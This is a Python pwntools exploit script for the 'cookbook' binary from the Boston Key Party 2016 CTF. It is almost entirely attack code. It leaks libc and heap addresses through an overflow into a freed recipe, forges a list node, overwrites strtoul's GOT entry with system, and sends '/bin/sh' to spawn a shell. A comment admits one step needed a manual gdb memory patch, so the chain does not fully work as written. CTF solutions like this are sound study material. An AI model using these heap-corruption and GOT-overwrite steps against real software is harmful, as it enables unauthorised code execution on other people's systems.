# -*- coding: utf-8 -*-
#
# Boston Key Party 2016 pwnable cookbook
#
# Based on http://yum3.tistory.com/48
#

from pwn import *
import re

r = process('./cookbook', aslr=False)
b = ELF('./cookbook')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

def s(msg):
    r.send(msg + '\n')

if __name__ == "__main__":
    r.recvuntil("what's your name?")
    s('babo')

    #
    # leak LIBC
    #
    s('c')
    s('n') # malloc()
    s('d') # free()
    s('q')

    r.recv()

    s('a')
    s('n') # malloc()
    s('g')
    s('A' * 116 + p32(b.got['puts']))
    s('q')
    
    s('c')
    r.recv()
    s('p')
    resp = r.recvuntil('[q]uit\n')
    s('q')
    r.recv()

    PUTS_ADDR = u32(re.findall(r"recipe type: (.+)", resp)[0][:4])
    LIBC_BASE = PUTS_ADDR - libc.symbols['puts']
    log.info('LIBC_BASE: 0x%x' % LIBC_BASE)
    SYSTEM_ADDR = LIBC_BASE + libc.symbols['system']
    log.info('SYSTEM_ADDR: 0x%x' % SYSTEM_ADDR)

    #
    # [2] leak 0x804d0a0
    #
    s('a')
    s('g')
    s('A' * 116 + p32(0x804d0a0))
    s('q')

    s('c')
    r.recv()
    s('p')
    resp = r.recvuntil('[q]uit\n')
    s('q')
    r.recv()

    CURRENT_RECIPE = u32(re.findall(r"recipe type: (.+)", resp)[0][:4])
    log.info('CURRENT_RECIPE: 0x%x' % CURRENT_RECIPE)

    #
    # add node to the list 
    #
    #
    # [listhead] [listhead] [name]
    # 0          4          140
    s('c')
    s('a')
    s('water')      # list_add(CURRENT_RECIPE, find_ingredient("water")
    s('1')          # list_add(CURRENT_RECIPE + 4, 1)
    
    s('a')          
    s('corn')       # list_add(CURRENT_RECIPE, find_ingredient("corn")
    s('1')          # list_add(CURRENT_RECIPE + 4, 1)

    s('a')          
    s('tomato')     # list_add(CURRENT_RECIPE, find_ingredient("tomato")
    s('1')          # list_add(CURRENT_RECIPE + 4, 1)
    s('q')
    r.recv()

    raw_input('after adding 3 ingredients...')

    #
    # leak
    #
    s('a')
    s('g')
    s('A'*116 + p32(CURRENT_RECIPE))
    s('q')

    s('c')
    r.recv()
    s('p')
    resp = r.recvuntil('[q]uit\n')
    s('q')
    r.recv()
    
    ORIGINAL_PTR = u32(re.findall(r"recipe type: (.+)", resp)[0][:4])
    log.info('ORIGINAL_PTR: 0x%x' % ORIGINAL_PTR)

    raw_input('after leaking...') 

    #
    # [5] make the fake second node
    #
    raw_input('[5] go?')
    s('a')
    s('n')
    s('s')
    #s(str(ORIGINAL_PTR))
    s(str(0))
    s('p')
    s(str(b.got['strtoul']))
    s('q')
    r.recv()

    #
    # [6] overwrite the first node to 0x804d098
    #
    raw_input('[6] go?')
    s('c')
    s('d')
    s('q')
    s('g')
    s('f')
    s(p32(ORIGINAL_PTR)+p32(0x804d098)+'\x00')
    r.recv()

    #
    # [7] free the second node
    # 

    # UNLINK approach failed! couldn't meet the constraint.
    # 
    # gdb -p `pidof cookbook` ./cookbook
    # pwndbg> set {int}0x804d03c = 0
    # pwndbg> quit
    
    raw_input('[7] go?')
    s('c')
    s('r')
    s('corn\x00')
    s('q')

    #
    # [8] overwrite strtoul@got
    #
    raw_input('[8] go?')
    s('a')
    s('s')
    s(str(SYSTEM_ADDR))
    s('q')
    r.recv()

    #
    # [9] trigger
    #
    raw_input('[9] go?')
    s('g')
    s('/bin/sh')

    r.interactive()
